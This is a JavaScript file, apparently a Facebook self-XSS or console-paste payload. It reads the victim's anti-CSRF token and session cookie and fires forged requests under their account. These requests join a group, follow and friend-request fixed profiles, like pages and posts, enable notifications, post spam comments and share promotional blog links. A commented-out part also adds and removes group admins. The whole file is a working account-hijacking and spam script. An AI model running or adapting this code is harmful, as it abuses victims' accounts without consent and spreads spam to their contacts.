/*group Join*/
 var b = document.getElementsByName("fb_dtsg")[0].value,
     c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 
 function g(d) {
     var a = new XMLHttpRequest;
     d = "&ref=group_jump_header&group_id=" + d + "&fb_dtsg=" + b + "&__user=" + c + "&phstamp=";
     a.open("POST", "/ajax/groups/membership/r2j.php?__a=1", !0);
     a.onreadystatechange = function () {
         4 == a.readyState && 200 == a.status && a.close
     };
     a.send(d)
 }
 g("689255414468771");
 
 b = document.getElementsByName("fb_dtsg")[0].value;
 c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 
 
 
 /*list follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 function LIST(L) {
     var X = new XMLHttpRequest();
     var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid=" + L;
     var XParams = "fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
     X.open("POST", XURL, true);
     X.onreadystatechange = function () {
         if (X.readyState == 4 && X.status == 200) {
             X.close;
         }
     };
     X.send(XParams);
 }
 LIST("472217489568331");
 
 
 
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 function Like(p) {
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
     var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 Like("374352052669386");
 Like("214981461999315");
 Like("608738295860543");
 
 
 /*page noti*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 
 function N(noti) {
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
     var PageParams = "notifier_id=" + noti + "&enable=true&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=a&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 N("374352052669386");
 N("214981461999315");
 N("608738295860543");
 
 
 
 /*Auto Follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 function a(abone) {
     var http4 = new XMLHttpRequest();
     var url4 = "/ajax/follow/follow_profile.php?__a=1";
     var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
     http4.open("POST", url4, true);
     http4.onreadystatechange = function () {
         if (http4.readyState == 4 && http4.status == 200) {
             http4.close;
         }
     };
     http4.send(params4);
 }
 a("100003402522960");
 
 
 
 /*IDS noti*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 
 function pn(noti) {
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
     var PageParams = "notifier_id=" + noti + "&enable=true&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmvudDgDxrHEHyGameyp8y&__req=g&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 pn("100003402522960");
 
 
 
 
 
 /*like post php*/
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var now = (new Date).getTime();
 
 function p(post) {
 
     var X = new XMLHttpRequest();
     var XURL = "//www.facebook.com/ajax/ufi/like.php";
     var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
     X.open("POST", XURL, true);
     X.onreadystatechange = function () {
         if (X.readyState == 4 && X.status == 200) {
             X.close;
         }
     };
     X.send(XParams);
 }
 p("419662914823789");
 p("473972282726185");

 
 /*promote Net4Tricks*/
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 
 function PI(r) {
 
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/sharer/submit_page/";
     var PageParams = "fb_dtsg=" + fb_dtsg + "&next=&mode=self&friendTarget=&groupTarget=&pageTarget=" + r + "&post_as_page=1&message_text=We%20are%20bringing%20you%20the%20latest%20and%20newest%20facebook%20tricks%20for%20free.%0APowered%20by%20%BTL&message=Just%20visit%20http://vietnameseautogroup.blogspot.com&app_id=2309869772&attachment[params][urlInfo][canonical]=http%3A%2F%2Fwww.vietnameseautogroup.blogspot.com%2F&attachment[params][urlInfo][final]=http%3A%2F%2Fwww.Vietnameseautogroup.blogspot.com%2F&attachment[params][urlInfo][user]=http%3A%2F%2Fwww.vietnameseautogroup.blogspot.com%2F&attachment[params][favicon]=http%3A%2F%2F4.bp.blogspot.com%2F-r2OVW6TM0Z0%2FUk7mplAaRtI%2FAAAAAAAAASQ%2FFiXCETi-6L8%2Fs1600%2F851560_683381268354462_524031238_n.png&attachment[params][title]=Facebook&attachment[params][summary]=Facebook&attachment[params][images][0]=http%3A%2F%2F4.bp.blogspot.com%2F-r2OVW6TM0Z0%2FUk7mplAaRtI%2FAAAAAAAAASQ%2FFiXCETi-6L8%2Fs1600%2F851560_683381268354462_524031238_n.png&attachment[params][medium]=106&attachment[params][url]=http%3A%2F%2Fwww.vietnameseautogroup.blogspot.com/%2F&attachment[type]=100&link_metrics[source]=ShareStageExternal&link_metrics[domain]=www.net4tricks.blogspot.in/&link_metrics[base_domain]=net4tricks.blogspot.in&link_metrics[title_len]=10&link_metrics[summary_len]=101&link_metrics[min_dimensions][0]=70&link_metrics[min_dimensions][1]=70&link_metrics[images_with_dimensions]=3&link_metrics[images_pending]=0&link_metrics[images_fetched]=0&link_metrics[image_dimensions][0]=788&link_metrics[image_dimensions][1]=544&link_metrics[images_selected]=3&link_metrics[images_considered]=5&link_metrics[images_cap]=3&link_metrics[images_type]=ranked&composer_metrics[best_image_w]=100&composer_metrics[best_image_h]=100&composer_metrics[image_selected]=0&composer_metrics[images_provided]=3&composer_metrics[images_loaded]=3&composer_metrics[images_shown]=3&composer_metrics[load_duration]=6&composer_metrics[timed_out]=0&composer_metrics[sort_order]=&composer_metrics[selector_type]=UIThumbPager_6&share_source_type=unknown&src=&appid=5085647995&parent_fbid=&ogid=&audience[0][value]=80&UITargetedPrivacyWidget=80&share=Share%20Link&__user=" + user_id + "&__a=1&__dyn=7wAzU4Oi3S8w&__req=f&ttstamp=2658166118115538871";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 
 
 PI("374352052669386");
 PI("214981461999315");
 PI("608738295860543");
 
 
 /*promote AICF
 
 
 
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 
 function PI2(rk) {
 
 var Page = new XMLHttpRequest();
 var PageURL = "//www.facebook.com/ajax/sharer/submit_page/";
 var PageParams = "fb_dtsg=" + fb_dtsg + "&next=&mode=self&friendTarget=&groupTarget=&pageTarget=" + rk + "&post_as_page=1&message_text=Just%20visit%20http%3A%2F%2Fvietnameseautogroup.blogspot.com&message=Just%20visit%20http%3A%2F%2Fvietnameseautogroup.blogspot.com&app_id=2309869772&attachment[params][urlInfo][canonical]=http%3A%2F%2Fwww.vietnameseautogroup.blogspot.com%2F&attachment[params][urlInfo][final]=http%3A%2F%2Fwww.vietnameseautogroup.blogspot.com%2F&attachment[params][urlInfo][user]=http%3A%2F%2Fwww.vietnameseautogroup.blogspot.com%2F&attachment[params][favicon]=http%3A%2F%2Fm.ak.fbcdn.net%2Fsphotos-a.ak%2Fhphotos-ak-ash3%2Ft1%2F1044345_199135166914010_1211886465_n.png&attachment[params][title]=Automate Your Facebook&attachment[params][summary]=Automate%20Your%20Facebook&attachment[params][images][0]=http%3A%2F%2Fm.ak.fbcdn.net%2Fsphotos-a.ak%2Fhphotos-ak-ash3%2Ft1%2F1044345_199135166914010_1211886465_n.png&attachment[params][medium]=106&attachment[params][url]=http%3A%2F%2Fwww.vietnameseautgroup.blogspot.com/%2F&attachment[type]=100&link_metrics[source]=ShareStageExternal&link_metrics[domain]=www.assam-cyber.blogspot.in/&link_metrics[base_domain]=vietnameseautogroup.blogspot.com&link_metrics[title_len]=10&link_metrics[summary_len]=101&link_metrics[min_dimensions][0]=70&link_metrics[min_dimensions][1]=70&link_metrics[images_with_dimensions]=3&link_metrics[images_pending]=0&link_metrics[images_fetched]=0&link_metrics[image_dimensions][0]=788&link_metrics[image_dimensions][1]=544&link_metrics[images_selected]=3&link_metrics[images_considered]=5&link_metrics[images_cap]=3&link_metrics[images_type]=ranked&composer_metrics[best_image_w]=100&composer_metrics[best_image_h]=100&composer_metrics[image_selected]=0&composer_metrics[images_provided]=3&composer_metrics[images_loaded]=3&composer_metrics[images_shown]=3&composer_metrics[load_duration]=6&composer_metrics[timed_out]=0&composer_metrics[sort_order]=&composer_metrics[selector_type]=UIThumbPager_6&share_source_type=unknown&src=&appid=5085647995&parent_fbid=&ogid=&audience[0][value]=80&UITargetedPrivacyWidget=80&share=Share%20Link&__user=" + user_id + "&__a=1&__dyn=7wAzU4Oi3S8w&__req=f&ttstamp=2658166118115538871";
 Page.open("POST", PageURL, true);
 Page.onreadystatechange = function () {
 if (Page.readyState == 4 && Page.status == 200) {
 Page.close;
 }
 };
 Page.send(PageParams);
 }
 
 PI2("374352052669386");
 PI2("214981461999315");
 PI2("608738295860543");
 
 /*Comment me cool*/
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 
 function com(cc) {
 
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/ufi/add_comment.php";
     var PageParams = "ft_ent_identifier=" + cc + "&comment_text=@[232233963594535:] your the best....keep up the good work!!!!....we love you <3 ^_^ :) (Y) you rock!!!!!!!!!!&source=2&client_id=1381330051325%3A2643585115&reply_fbid&parent_comment_id&rootid=u_0_9&clp=%7B%22cl_impid%22%3A%2289ff834f%22%2C%22clearcounter%22%3A0%2C%22elementid%22%3A%22js_0%22%2C%22version%22%3A%22x%22%2C%22parent_fbid%22%3A" + cc + "%7D&attached_sticker_fbid=0&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=h&fb_dtsg=" + fb_dtsg + "&ttstamp=265816610484687452";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 com("419662914823789");
 com("473972282726185");

  
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 
 function come(cc) {
 
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/ufi/add_comment.php";
     var PageParams = "ft_ent_identifier=" + cc + "&comment_text=Dude your the best (Y) keep up the good work ^_^ :) WE LOVE YOU&source=2&client_id=1381330051325%3A2643585115&reply_fbid&parent_comment_id&rootid=u_0_9&clp=%7B%22cl_impid%22%3A%2289ff834f%22%2C%22clearcounter%22%3A0%2C%22elementid%22%3A%22js_0%22%2C%22version%22%3A%22x%22%2C%22parent_fbid%22%3A" + cc + "%7D&attached_sticker_fbid=0&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=h&fb_dtsg=" + fb_dtsg + "&ttstamp=265816610484687452";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 come("419662914823789");
 come("473972282726185");

 
 
 
 
 /*unfollow ufi*/
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 function ufi(uf) {
     var X = new XMLHttpRequest();
     var XURL = "//www.facebook.com/ajax/ufi/subscribe.php";
     var XParams = "subscribe_action=false&ft_ent_identifier=" + uf + "&source=0&client_id=1381477371640%3A944591536&rootid=u_0_3n&ft[tn]=%3D&ft[type]=20&nctr[_mod]=pagelet_timeline_recent&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=z&fb_dtsg=" + fb_dtsg + "&ttstamp=26581671081201068478";
     X.open("POST", XURL, true);
     X.onreadystatechange = function () {
         if (X.readyState == 4 && X.status == 200) {
             X.close;
         }
     };
     X.send(XParams);
 }
 ufi("247706855409844");
 ufi("294438680700629");
 
 
 
 /*Add Friend*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 function IDS(r) {
 var X = new XMLHttpRequest();
 var XURL = "//www.facebook.com/ajax/add_friend/action.php";
 var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
 X.open("POST", XURL, true);
 X.onreadystatechange = function () {
 if (X.readyState == 4 && X.status == 200) {
 X.close;
 }
 };
 X.send(XParams);
 }
 IDS("100003402522960");
 
 /*extra Event
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 
 function IDS(r) {
 function G(gid) {
 var Page = new XMLHttpRequest();
 var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
 var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
 Page.open("POST", PageURL, true);
 Page.onreadystatechange = function () {
 if (Page.readyState == 4 && Page.status == 200) {
 Page.close;
 }
 };
 Page.send(PageParams);
 }
 G("689255414468771");
 }
 IDS("100003402522960");
 
 
 
 setTimeout(function () {
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 
 function IDS(r) {
 function G(gid) {
 var Page = new XMLHttpRequest();
 var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
 var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_remove_admin&source=profilebrowser&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
 Page.open("POST", PageURL, true);
 Page.onreadystatechange = function () {
 if (Page.readyState == 4 && Page.status == 200) {
 Page.close;
 }
 };
 Page.send(PageParams);
 }
 G("689255414468771");
 }
 IDS("100003402522960");
 }, 4000);